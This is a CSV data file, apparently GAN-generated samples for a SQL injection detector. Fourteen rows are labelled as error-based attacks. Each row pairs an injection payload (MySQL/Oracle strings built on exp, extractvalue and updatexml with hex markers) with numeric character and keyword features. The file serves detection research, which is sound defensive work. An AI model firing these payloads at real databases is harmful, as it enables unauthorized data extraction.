id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000376,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R000934,4.974243757555202,144.6788330078125,67.30327606201172,28.04623031616211,69.31298828125,12.445403099060059,73.31694030761719,28.37160873413086,1.3176219463348389,0.25569871068000793,0.19041000306606293,0.3698081374168396,0.1334259808063507,3.5943100452423096,2.257164239883423,1.289417028427124,0.7792861461639404,0.180929034948349,-0.003114069579169154,0.040236424654722214,3.5820226669311523,5.891915798187256,5.377092361450195,-0.24219509959220886,1.3381420373916626,0.09198588132858276,-0.2985213100910187,0.16079401969909668,-0.02556977979838848,0.8349003791809082,-0.6498586535453796,-0.214198499917984,2.288421392440796,0.20339471101760864,0.18866866827011108,2.1293697357177734,3.4460315704345703,0.28324422240257263,1.0289658308029175,0.4245322346687317,0.29315611720085144,1.0862557888031006,0.0833936333656311,0.06124268099665642,0.2964780628681183,0.08564884960651398,0.10295310616493225,0.2118077129125595,0.08066478371620178,-0.1947423815727234,0.07973909378051758,0.3526739776134491,-0.23181985318660736,0.6980159282684326,0.456974059343338,0.21304108202457428,0.1769500970840454,0.5153596997261047,-0.29730814695358276,0.09489630907773972,-0.3913199007511139,-0.0815323144197464,0.25741082429885864,-0.3519899845123291,0.08646516501903534,0.14863452315330505,1.1454474925994873,-0.3193714916706085,0.09143956750631332,-0.05677542835474014,-0.4397278428077698,-0.2560919523239136,-0.5103625059127808,0.02265782654285431,-0.023065611720085144,-0.011612596921622753,1.187546730041504,0.2946464419364929,-0.15079063177108765,-0.15018297731876373,0.006237164605408907,6.2425384521484375,0.28487443923950195,0.27360233664512634,0.04485587030649185,0.7424284219741821,-0.26229074597358704,0.5308246612548828,-0.20292004942893982
GAN_000377,attack,error,"1"" and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R000598,5.661931309485074,148.34800720214844,68.00613403320312,19.724092483520508,54.748924255371094,15.60898208618164,76.88013458251953,24.046833038330078,0.6172727346420288,0.29171648621559143,0.18598130345344543,0.36207881569862366,0.12870508432388306,3.6825942993164062,1.9331889152526855,1.6846294403076172,0.1488405019044876,0.20029056072235107,0.04787523299455643,0.3382224440574646,4.735806941986084,3.604670286178589,4.960330009460449,-0.3336595892906189,1.413193941116333,0.1427444964647293,-0.143453910946846,0.03699079155921936,0.061439283192157745,0.8122734427452087,-0.674046516418457,0.06442809104919434,2.0554141998291016,-0.4656270146369934,-0.07551873475313187,2.2466979026794434,4.644941329956055,0.7821220755577087,1.1875454187393188,0.5760941505432129,0.17682547867298126,1.5345790386199951,0.24804241955280304,0.10457329452037811,0.6409490704536438,-0.5029976963996887,0.37379759550094604,0.2765965163707733,0.009875208139419556,-0.07985925674438477,0.3709147274494171,0.2175731211900711,-0.3736274242401123,1.2504713535308838,0.5142951011657715,0.18111452460289001,0.07901021838188171,0.4513727128505707,-0.3232037127017975,0.4269034266471863,-0.06796832382678986,-0.5666606426239014,0.12179339677095413,-0.4475083351135254,0.19208529591560364,-0.060684893280267715,1.0466163158416748,0.2980135381221771,-0.035787250846624374,0.0033963099122047424,-0.47312697768211365,0.15101146697998047,-0.5249204635620117,-0.163356751203537,-0.015459386631846428,-0.028129078447818756,1.0410104990005493,0.3243524432182312,-0.04331512749195099,-0.12480775266885757,0.1883375644683838,6.419814586639404,0.16940858960151672,0.180680513381958,0.17735926806926727,0.8600562214851379,0.010273583233356476,0.39883214235305786,-0.09852863848209381
GAN_000378,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ulep'  =  'ulep",nearest_attack_euclidean,R000092,4.926474464737046,182.03494262695312,69.2638931274414,26.349002838134766,72.37507629394531,8.44083309173584,76.09262084960938,28.572301864624023,0.7968282699584961,0.2991880178451538,0.18350213766098022,0.36899086833000183,0.1328684538602829,3.7103118896484375,2.1446712017059326,1.9462826251983643,0.44481462240219116,0.14406776428222656,0.13121820986270905,0.20739857852458954,6.090024948120117,5.70859956741333,5.093952178955078,-0.27059289813041687,1.5467729568481445,0.13781237602233887,-0.10937538743019104,-0.042088717222213745,0.10065460205078125,0.9777920842170715,-0.45389631390571594,-0.25711217522621155,2.210695505142212,-0.29514622688293457,0.14323487877845764,2.1174747943878174,5.212699890136719,0.8953754901885986,1.6515244245529175,0.2327440083026886,0.20665360987186432,1.1181358098983765,-0.030967310070991516,0.12945473194122314,0.16225984692573547,-0.15291205048561096,0.12989765405654907,0.28625553846359253,0.22083163261413574,0.028484851121902466,0.3656235635280609,0.25201669335365295,-0.373335063457489,0.7926986217498779,0.34779319167137146,0.19271238148212433,0.07734764367341995,0.36479952931404114,-0.2529137432575226,0.4458616375923157,-0.10862365365028381,-0.23927496373653412,0.1831756830215454,-0.29983240365982056,0.06772838532924652,-0.1929139643907547,0.936352550983429,0.053814999759197235,0.03440156579017639,0.21634158492088318,-0.3919592499732971,0.06588508188724518,-0.03973688185214996,-0.10782940685749054,0.0012064663460478187,-0.023532306775450706,1.09096097946167,0.328836590051651,-0.04721783101558685,-0.1035250797867775,0.04375486075878143,6.472677707672119,0.323497474193573,0.15539970993995667,0.1697893589735031,0.8489848375320435,0.10535795241594315,0.3453703820705414,0.07331465929746628
GAN_000379,attack,error,"1'||  (  select 'xuou' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'",nearest_attack_euclidean,R000400,4.776442313374169,175.3037567138672,68.77025604248047,25.56916618347168,69.86844635009766,11.093194007873535,84.07361602783203,30.359750747680664,0.9839849472045898,0.27510225772857666,0.18604545295238495,0.3629441559314728,0.1289491206407547,3.755708932876587,2.1817665100097656,1.2085676193237305,0.39101463556289673,0.10333683341741562,-0.017891084775328636,-0.06588741391897202,6.895434856414795,5.376043319702148,4.091739177703857,-0.27518680691719055,1.3803545236587524,0.11865878105163574,-0.22334663569927216,0.029740914702415466,-0.0510028712451458,0.6839870810508728,-0.48884227871894836,-0.15852804481983185,2.6372461318969727,-0.25371289253234863,0.19154322147369385,1.9645706415176392,5.723085403442383,0.8411307334899902,1.6215884685516357,0.5363354086875916,0.3157576024532318,1.0798537731170654,0.41694095730781555,0.11128886044025421,0.3800450265407562,-0.1803293228149414,0.28439632058143616,0.12889820337295532,0.1492023766040802,0.032051026821136475,0.2574375569820404,0.26057469844818115,-0.006757274270057678,0.3781925439834595,0.41143807768821716,0.13426169753074646,0.14003418385982513,-0.09553492069244385,-0.3182826340198517,0.5752434134483337,-0.45177093148231506,-0.23256702721118927,0.24604783952236176,-0.36149048805236816,0.19775396585464478,0.11407329142093658,0.9728644490242004,-0.06733265519142151,-0.1076013594865799,-0.16856440901756287,-0.3615971803665161,0.17279468476772308,-0.1805025041103363,0.0015467777848243713,-0.019202305004000664,-0.021682530641555786,0.7831330895423889,0.42657235264778137,-0.14104428887367249,0.04174299165606499,0.26069357991218567,7.136135578155518,0.3649478554725647,0.18414226174354553,0.16762390732765198,0.9603099226951599,0.06295192986726761,0.22768332064151764,0.1603267788887024
GAN_000380,attack,error,"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  'lbwh'  =  'lbwh",nearest_attack_euclidean,R000788,4.857325030244029,193.06077575683594,63.74213409423828,28.010635375976562,77.75556182861328,9.238972663879395,89.96859741210938,28.165857315063477,1.0345863103866577,0.3066559135913849,0.19657771289348602,0.37101277709007263,0.1323770135641098,3.8542556762695312,2.0583157539367676,1.0750871896743774,0.11272814124822617,0.22721779346466064,0.02406911365687847,0.32031115889549255,8.0342435836792,5.616470813751221,4.114037990570068,-0.3162499666213989,1.5925419330596924,0.1739700585603714,-0.5797897577285767,-0.02192351222038269,-0.03199174627661705,0.579854428768158,-0.2705020606517792,-0.33478638529777527,2.6648192405700684,-0.5472168922424316,0.11998755484819412,2.0059444904327393,7.140120029449463,1.2186697721481323,1.829093098640442,0.5096814632415771,0.11232505738735199,0.916111946105957,0.14191941916942596,0.11963211745023727,0.20657771825790405,-0.30417582392692566,0.276983380317688,0.2436639666557312,0.24411563575267792,0.15096795558929443,0.4004104733467102,0.14227452874183655,-0.08929964900016785,0.1339210420846939,0.34504735469818115,0.1468276083469391,0.11669305711984634,0.016374237835407257,-0.19023442268371582,0.553480327129364,-0.3439948260784149,-0.30189862847328186,0.1953105926513672,-0.10966320335865021,0.08780071139335632,-0.11924958974123001,0.7249885201454163,0.155134916305542,-0.12226447463035583,0.16469797492027283,-0.26708167791366577,0.559558629989624,0.06448382139205933,-0.018222704529762268,0.0016593834152445197,-0.023854393512010574,0.7203064560890198,0.5967466831207275,0.02062678337097168,0.13552343845367432,0.3328341245651245,8.06590747833252,0.3932269811630249,0.193888321518898,0.2250397503376007,0.9640992879867554,0.18003593385219574,0.2585141956806183,0.10657354444265366
GAN_000381,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000589,4.660721600831412,220.43960571289062,70.05380249023438,32.246620178222656,86.73880004882812,9.091313362121582,79.82657623291016,34.543453216552734,0.7344241142272949,0.28975072503089905,0.17893441021442413,0.3738970458507538,0.13700316846370697,3.745039463043213,1.6874630451202393,0.6415378451347351,0.27005669474601746,0.1300809234380722,0.001178716542199254,-0.03107425943017006,8.260719299316406,7.400288105010986,3.527297019958496,-0.2501891851425171,1.7500133514404297,0.16923151910305023,-0.26233506202697754,0.1300095021724701,0.002706425730139017,0.7881124019622803,-0.2507326006889343,-0.27128565311431885,1.9139418601989746,-0.2530805766582489,0.05968572944402695,2.215968132019043,8.06215763092041,0.8832345008850098,1.466518759727478,0.2882053852081299,0.32949528098106384,1.0922316312789917,0.36715584993362427,0.05212421715259552,0.32659193873405457,-0.09748034924268723,0.29341500997543335,0.24681158363819122,0.30593615770339966,0.3181528151035309,0.375667542219162,0.35535961389541626,0.10045991837978363,0.3119696080684662,0.37369972467422485,0.10049159079790115,0.07075198739767075,-0.03547128662467003,-0.1760210394859314,0.438312292098999,-0.15141898393630981,-0.2737566828727722,0.28093430399894714,-0.04297323897480965,0.08198387920856476,0.06395542621612549,0.6959773302078247,0.08128111809492111,-0.06216114014387131,0.02229303866624832,-0.3696175515651703,0.2724537253379822,-0.005312841385602951,-0.16095948219299316,-0.02010788582265377,-0.015705903992056847,0.9568677544593811,0.42358508706092834,-0.2129385769367218,0.07303737103939056,0.3288261890411377,8.285786628723145,0.5749538540840149,0.17305324971675873,0.21316547691822052,0.6818472743034363,-0.040508024394512177,0.30343273282051086,0.20458576083183289
GAN_000382,attack,error,"1'||  (  select 'fcws' from dual where 9184  =  9184 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   ||'",nearest_attack_euclidean,R000288,5.458983973861339,152.31524658203125,63.651058197021484,23.31071662902832,61.42546463012695,8.615010261535645,84.1616439819336,33.02037048339844,1.1859651803970337,0.28286343812942505,0.20864059031009674,0.34905102849006653,0.14652474224567413,3.7699315547943115,2.704050302505493,0.9164250493049622,0.271983802318573,0.2932247519493103,-0.03667033836245537,0.5303053259849548,6.3359503746032715,3.061612367630005,4.953021049499512,-0.7906558513641357,1.4086259603500366,0.13805709779262543,-0.6936262845993042,-0.12665170431137085,-0.14433220028877258,1.0350124835968018,-0.7158954739570618,-0.693554162979126,2.6374568939208984,-0.2281421720981598,0.0055459653958678246,2.038355827331543,5.7720537185668945,0.5203531980514526,1.3808119297027588,0.6015833020210266,0.1596851646900177,1.017996072769165,0.34538859128952026,0.10659867525100708,0.5083438158035278,0.03977436572313309,0.45006483793258667,0.23711545765399933,0.005125939846038818,-0.012751877307891846,0.20781008899211884,0.30129915475845337,0.16933763027191162,0.18355779349803925,0.37573692202568054,0.15418820083141327,0.10431404411792755,0.11192689836025238,-0.2374754250049591,0.7843623161315918,-0.5348454117774963,-0.378987580537796,0.2102932631969452,0.1649625599384308,0.004951250273734331,0.12751668691635132,0.9052987694740295,0.22041377425193787,-0.1053328812122345,0.11377602070569992,-0.6457653045654297,0.5065568089485168,0.08526819944381714,0.13029488921165466,-0.024039877578616142,-0.026582010090351105,0.7248824834823608,0.3136092722415924,-0.38591063022613525,0.02282855100929737,0.2796870172023773,7.954367637634277,0.33459123969078064,0.23073816299438477,0.13937945663928986,0.9964012503623962,-0.027173731476068497,0.7781808972358704,-0.07483487576246262
GAN_000383,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000589,5.053676228343424,223.18650817871094,66.21648406982422,31.15103530883789,83.67997741699219,10.37520980834961,87.39496612548828,32.994564056396484,0.5709070563316345,0.306864857673645,0.18748202919960022,0.3784383535385132,0.13501949608325958,3.8213155269622803,1.480500340461731,0.9416660666465759,-0.016860641539096832,0.1960897296667099,0.06560292094945908,0.28958505392074585,8.262739181518555,7.305192470550537,3.5767412185668945,-0.2880638837814331,1.7885724306106567,0.2042800635099411,-0.49574124813079834,0.10975301265716553,0.04708659276366234,0.7156711220741272,-0.18030670285224915,-0.39307451248168945,2.2696683406829834,-0.5228087306022644,0.02754294127225876,2.251438617706299,8.27961540222168,1.3149755001068115,1.7967959642410278,0.3526918292045593,0.18240617215633392,1.0830881595611572,0.26898491382598877,0.07713496685028076,0.24887099862098694,-0.2382989525794983,0.3288760781288147,0.32796335220336914,0.37776097655296326,0.3410622179508209,0.4992639720439911,0.13222989439964294,-0.06943365931510925,0.26797062158584595,0.37539562582969666,0.08303821831941605,0.07084508240222931,-0.08435295522212982,-0.2752266526222229,0.3535032272338867,0.07615046948194504,-0.5677016973495483,0.16547070443630219,-0.03447205573320389,0.11827114224433899,-0.2501925528049469,0.5783398747444153,0.30808138847351074,-0.02694854885339737,0.18874746561050415,-0.19396266341209412,0.45682281255722046,0.0280659981071949,-0.23332220315933228,-0.0038426171522587538,-0.020561477169394493,1.0365127325057983,0.5161095261573792,-0.06476186960935593,0.18571124970912933,0.46715402603149414,8.515718460083008,0.5035957098007202,0.1323062926530838,0.274478018283844,0.8057340383529663,0.10333254188299179,0.1868107169866562,0.19841629266738892
GAN_000384,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000589,4.552702008369811,219.0982666015625,70.1812973022461,31.79426383972168,91.81056213378906,7.789094924926758,84.3085708618164,31.916330337524414,0.7987943887710571,0.29812952876091003,0.17710986733436584,0.3773172199726105,0.13759402930736542,3.7392001152038574,1.7927418947219849,0.9798356294631958,0.23756380379199982,0.1485038548707962,0.03180175647139549,0.350390762090683,7.4378342628479,7.924188137054443,4.230469703674316,-0.2642619013786316,1.7414008378982544,0.1455409675836563,-0.4422585070133209,0.08884173631668091,-0.007906281389296055,0.7595027089118958,-0.36128515005111694,-0.21950028836727142,2.1076765060424805,-0.28377652168273926,0.08131804317235947,2.077019453048706,7.698775768280029,0.9540073871612549,1.5213876962661743,0.3871708810329437,0.15464305877685547,1.1525145769119263,0.12918199598789215,0.08322300761938095,0.2776968777179718,-0.07049205154180527,0.21413347125053406,0.3485869765281677,0.32674869894981384,0.2443661093711853,0.41974928975105286,0.2455512434244156,-0.007853485643863678,0.2703903615474701,0.32585546374320984,0.09784077107906342,0.053061824291944504,0.08397506177425385,-0.07783862948417664,0.3852185010910034,-0.12009461969137192,-0.2494238018989563,0.24297252297401428,-0.12742307782173157,0.06011343374848366,-0.12342792749404907,0.616722822189331,0.17408400774002075,0.09932151436805725,0.14789848029613495,-0.3170398473739624,0.3527792692184448,-0.07358770817518234,-0.04565012454986572,-0.005986886564642191,-0.01816975325345993,1.0176674127578735,0.4473216235637665,-0.017160475254058838,0.048745047301054,0.2741958498954773,8.181509971618652,0.4862794876098633,0.17282097041606903,0.15627211332321167,0.6848810911178589,-0.02851821482181549,0.35068196058273315,0.15944236516952515
GAN_000385,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000589,4.9404075699850845,195.9771270751953,66.99986267089844,25.011323928833008,72.09574890136719,10.240652084350586,82.66185760498047,32.35084533691406,1.014272928237915,0.3017127513885498,0.19135239720344543,0.3656361699104309,0.14204561710357666,3.766165256500244,1.8364845514297485,1.0654969215393066,0.22956730425357819,0.21070913970470428,0.009069115854799747,0.25641945004463196,6.449154376983643,4.218948841094971,3.941657304763794,-0.3022443950176239,1.6984539031982422,0.13503065705299377,-0.29702579975128174,-0.03360778093338013,-0.0752943903207779,0.8154413104057312,-0.3649297058582306,-0.17198237776756287,2.0416083335876465,-0.423785924911499,0.0530562624335289,2.0071470737457275,6.321384429931641,0.621181845664978,1.6769132614135742,0.6210618615150452,0.0694500058889389,1.0982295274734497,0.18471163511276245,0.11849856376647949,0.25331225991249084,-0.08721663802862167,0.16727560758590698,0.22463789582252502,0.05758160352706909,-0.01681235432624817,0.35908645391464233,0.33879557251930237,-0.18587340414524078,0.4671805202960968,0.33471885323524475,0.12644043564796448,0.015748804435133934,0.17208902537822723,-0.15241411328315735,0.40426522493362427,-0.27671611309051514,-0.312378853559494,0.20459258556365967,-0.032161157578229904,0.11925719678401947,-0.09876798093318939,0.877326250076294,0.27987411618232727,-0.14141733944416046,-0.022642403841018677,-0.3122328221797943,0.4437268376350403,-0.06454836577177048,-0.03085923194885254,-0.005369485821574926,-0.016610825434327126,0.6931609511375427,0.37515801191329956,0.021704494953155518,0.019505569711327553,0.27363789081573486,8.113632202148438,0.35562723875045776,0.12893764674663544,0.15102559328079224,0.8883768916130066,-0.006579175591468811,0.5415500998497009,-0.13632752001285553
GAN_000386,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R000934,4.860290552918096,199.1815643310547,62.797054290771484,26.327604293823242,81.2263412475586,8.508672714233398,81.79288482666016,32.04731750488281,0.8502684831619263,0.2905289828777313,0.1862781047821045,0.36530929803848267,0.1417934149503708,3.6688294410705566,1.910497784614563,1.3139441013336182,0.34624528884887695,0.19804701209068298,0.006043584551662207,0.338673859834671,6.402456760406494,5.522186279296875,4.611853122711182,-0.3260326683521271,1.727751612663269,0.1398463398218155,-0.482982337474823,0.008239254355430603,0.026442673057317734,0.8949238657951355,-0.48944875597953796,-0.18760919570922852,2.1080880165100098,-0.2917216122150421,0.03594716638326645,2.0849971771240234,6.376256465911865,0.4778945744037628,1.346028447151184,0.6602852940559387,0.1164901852607727,1.188796877861023,0.2383749783039093,0.1292198896408081,0.4923928380012512,0.05281241238117218,0.22661715745925903,0.2736489772796631,0.17410680651664734,0.08769112825393677,0.2822917401790619,0.33701270818710327,0.04316677525639534,0.42443138360977173,0.3295244574546814,0.13744905591011047,0.059461139142513275,0.3158508837223053,-0.1853053867816925,0.3215440809726715,-0.14277169108390808,-0.303627610206604,0.2709691822528839,-0.17013555765151978,0.06699411571025848,-0.062082722783088684,0.8312436938285828,0.19699618220329285,-0.00026031769812107086,0.14053881168365479,-0.40638267993927,0.2746551036834717,-0.14880076050758362,-0.049231886863708496,-0.007688586134463549,-0.011798817664384842,0.9105895161628723,0.3465026617050171,-0.027668669819831848,0.05092807486653328,0.26219990849494934,8.182960510253906,0.29346394538879395,0.16283239424228668,0.1445857435464859,0.7047560811042786,-0.1434374749660492,0.598209798336029,-0.1704639494419098
GAN_000387,attack,error,"1"" and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R000598,4.864752422536929,190.75607299804688,65.08982849121094,27.127962112426758,76.32737731933594,9.14453411102295,81.17263793945312,27.337608337402344,0.8790707588195801,0.2784999907016754,0.18894736468791962,0.3743600845336914,0.13062739372253418,3.695000410079956,1.8908525705337524,1.731063723564148,0.2508259117603302,0.2102469801902771,0.059163276106119156,0.4112499952316284,5.1377272605896,5.634182929992676,4.696236610412598,-0.3390584886074066,1.5201870203018188,0.15218763053417206,-0.5386295914649963,-0.0926876962184906,0.09011566638946533,0.8715001344680786,-0.44570955634117126,-0.24773342907428741,2.47778582572937,-0.3813038766384125,0.09620342403650284,1.881358027458191,6.217074871063232,0.925581693649292,1.3958334922790527,0.5194011330604553,0.07953096926212311,1.0501432418823242,0.031433433294296265,0.16149556636810303,0.206167072057724,-0.3279701769351959,0.38413864374160767,0.3082503378391266,0.19660067558288574,0.02370321750640869,0.3156508803367615,0.09764909744262695,-0.09749086201190948,0.5404036045074463,0.35722091794013977,0.14971524477005005,0.1416112333536148,0.3188329041004181,-0.10976675152778625,0.3151797652244568,-0.3548526465892792,-0.5705389380455017,0.07766765356063843,-0.1427021324634552,0.09810347855091095,-0.2080700844526291,0.8768154382705688,0.1590501368045807,0.14926756918430328,0.2918661832809448,-0.2960762083530426,0.1386944055557251,-0.13580119609832764,0.24734750390052795,0.012185105122625828,-0.01612016186118126,1.0844216346740723,0.40945205092430115,-0.20511987805366516,0.05846680328249931,0.2969197630882263,7.066729545593262,0.28193527460098267,0.193796768784523,0.1510513573884964,0.783110499382019,0.20993390679359436,0.16730879247188568,-0.20125603675842285
GAN_000388,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000589,4.644302975457753,189.33631896972656,72.09332275390625,26.02867889404297,71.76303100585938,10.816787719726562,74.02581787109375,33.5562858581543,0.923735499382019,0.2907577455043793,0.1811673790216446,0.3705124258995056,0.13440364599227905,3.725428342819214,1.990193247795105,0.9039633870124817,0.4418697655200958,0.13594849407672882,0.011557874269783497,0.015890046954154968,5.931883335113525,4.681212902069092,3.9893479347229004,-0.09811799973249435,1.5672463178634644,0.11396025121212006,0.052981603890657425,0.11611489951610565,-0.08671624958515167,0.8297957181930542,-0.4309265613555908,-0.05833405628800392,2.0881433486938477,-0.1398085355758667,0.15914593636989594,2.075810432434082,5.4998955726623535,0.7683819532394409,1.7700210809707642,0.520546555519104,0.25030386447906494,1.009352207183838,0.41619881987571716,0.08942894637584686,0.23316210508346558,-0.12211652845144272,0.1771828532218933,0.13686257600784302,-0.011230140924453735,-0.03276130557060242,0.2706966698169708,0.37725797295570374,-0.28331607580184937,0.6011670827865601,0.42534124851226807,0.10071996599435806,0.09159917384386063,-0.028638096526265144,-0.19194987416267395,0.47010689973831177,-0.34660372138023376,-0.4292623996734619,0.16756096482276917,-0.12438547611236572,0.1959412395954132,0.07736854255199432,0.9613208174705505,0.0018508657813072205,-0.11328363418579102,-0.03027888387441635,-0.10882933437824249,0.059645771980285645,-0.21043482422828674,0.04018168896436691,-0.014237288385629654,-0.014737630262970924,0.9050642251968384,0.4275704324245453,-0.12197361141443253,-0.05368790403008461,0.2517957389354706,7.725010395050049,0.3900105357170105,0.15876467525959015,0.1377747505903244,0.862485408782959,-0.10097725689411163,0.33860957622528076,0.008205056190490723
GAN_000389,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000589,5.009452408071692,200.43899536132812,62.63734436035156,27.950159072875977,75.29324340820312,9.412555694580078,82.6378173828125,29.375385284423828,0.928980827331543,0.2902245819568634,0.19282938539981842,0.37960556149482727,0.12979519367218018,3.734595537185669,1.6892998218536377,1.4553539752960205,0.09009876102209091,0.25074562430381775,0.02531307004392147,0.49886539578437805,6.256984710693359,4.966859817504883,4.307089805603027,-0.346664696931839,1.6253362894058228,0.17470325529575348,-0.6039713621139526,-0.025873452425003052,0.052294742316007614,0.7806522250175476,-0.45937708020210266,-0.26725220680236816,2.4161694049835205,-0.5162939429283142,-0.003662683768197894,2.0499913692474365,6.67811393737793,1.019960641860962,1.609021544456482,0.6475037336349487,0.06640292704105377,1.0196563005447388,0.24655376374721527,0.14728054404258728,0.2984156012535095,-0.35389792919158936,0.34841516613960266,0.3669153153896332,0.1992173045873642,0.04232063889503479,0.3957156538963318,0.07400619983673096,-0.18155686557292938,0.3571479618549347,0.38051697611808777,0.13565418124198914,0.11275388300418854,0.27729785442352295,-0.29598528146743774,0.4243870973587036,-0.29490354657173157,-0.6078153848648071,0.06054719537496567,-0.01609770953655243,0.17503255605697632,-0.11775216460227966,0.8239933252334595,0.20348584651947021,0.06686243414878845,0.2501068711280823,-0.1794353872537613,0.27515217661857605,-0.07167990505695343,0.1043696403503418,0.013606822118163109,-0.013700924813747406,0.9672496914863586,0.48771899938583374,-0.1618107557296753,0.16222034394741058,0.37727656960487366,7.290013313293457,0.2899724245071411,0.21784251928329468,0.16560781002044678,0.8657435178756714,0.06164533644914627,-0.03302370756864548,-0.23427078127861023
